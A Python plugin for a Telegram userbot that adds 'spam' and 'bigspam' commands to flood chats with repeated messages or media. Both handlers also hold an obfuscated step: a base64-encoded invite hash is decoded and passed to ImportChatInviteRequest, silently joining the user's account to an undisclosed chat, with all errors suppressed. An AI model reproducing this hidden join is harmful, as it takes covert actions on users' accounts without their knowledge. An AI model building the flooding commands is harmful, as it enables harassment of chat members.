import asyncio
import os

import pybase64
from telethon import functions
from telethon import types
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from fridaybot.utils import edit_or_reply
from fridaybot.utils import friday_on_cmd
from fridaybot.utils import sudo_cmd


@friday.on(friday_on_cmd(pattern="spam (.*)"))
async def spammer(e):
    if e.fwd_from:
        return
    await e.get_chat()
    reply_to_id = e.message
    if e.reply_to_msg_id:
        reply_to_id = await e.get_reply_message()
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except BaseException:
        pass
    cat = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(cat[0])
    if counter > 50:
        return await edit_or_reply(e,
                                   "Use `.bigspam` for spam greater than 50")
    if len(cat) == 2:
        spam_message = str(
            ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)[1])
        await e.delete()
        for _ in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
            else:
                await e.client.send_message(e.chat_id, spam_message)
            await asyncio.sleep(0.1)

    elif reply_to_id.media:
        to_download_directory = Config.TMP_DOWNLOAD_DIRECTORY
        downloaded_file_name = os.path.join(to_download_directory, "spam")
        downloaded_file_name = await e.client.download_media(
            reply_to_id.media, downloaded_file_name)
        await e.delete()
        if os.path.exists(downloaded_file_name):
            sandy = None
            for _ in range(counter):
                if sandy:
                    sandy = await e.client.send_file(e.chat_id, sandy)
                else:
                    sandy = await e.client.send_file(e.chat_id,
                                                     downloaded_file_name)
                try:
                    await e.client(
                        functions.messages.SaveGifRequest(
                            id=types.InputDocument(
                                id=sandy.media.document.id,
                                access_hash=sandy.media.document.access_hash,
                                file_reference=sandy.media.document.
                                file_reference,
                            ),
                            unsave=True,
                        ))
                except:
                    pass
                await asyncio.sleep(0.5)

    elif reply_to_id.text and e.reply_to_msg_id:
        spam_message = reply_to_id.text
        await e.delete()
        for _ in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
            else:
                await e.client.send_message(e.chat_id, spam_message)
            await asyncio.sleep(0.5)

    else:
        await edit_or_reply(
            e, "try again something went wrong or check `.info spam`")


@friday.on(friday_on_cmd(pattern="bigspam (.*)"))
async def spammer(e):
    if e.fwd_from:
        return
    await e.get_chat()
    reply_to_id = e.message
    if e.reply_to_msg_id:
        reply_to_id = await e.get_reply_message()
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except BaseException:
        pass
    cat = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(
            ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)[1])
        await e.delete()
        for _ in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
            else:
                await e.client.send_message(e.chat_id, spam_message)
            await asyncio.sleep(1)

    elif reply_to_id.media:
        to_download_directory = Config.TMP_DOWNLOAD_DIRECTORY
        downloaded_file_name = os.path.join(to_download_directory, "spam")
        downloaded_file_name = await e.client.download_media(
            reply_to_id.media, downloaded_file_name)
        await e.delete()
        if os.path.exists(downloaded_file_name):
            for _ in range(counter):
                sandy = await e.client.send_file(e.chat_id,
                                                 downloaded_file_name)
                try:
                    await e.client(
                        functions.messages.SaveGifRequest(
                            id=types.InputDocument(
                                id=sandy.media.document.id,
                                access_hash=sandy.media.document.access_hash,
                                file_reference=sandy.media.document.
                                file_reference,
                            ),
                            unsave=True,
                        ))
                except:
                    pass
                await asyncio.sleep(1.5)

    elif reply_to_id.text and e.reply_to_msg_id:
        spam_message = reply_to_id.text
        await e.delete()
        for _ in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
            else:
                await e.client.send_message(e.chat_id, spam_message)
            await asyncio.sleep(1)

    else:
        await edit_or_reply(
            e, "try again something went wrong or check `.info spam`")
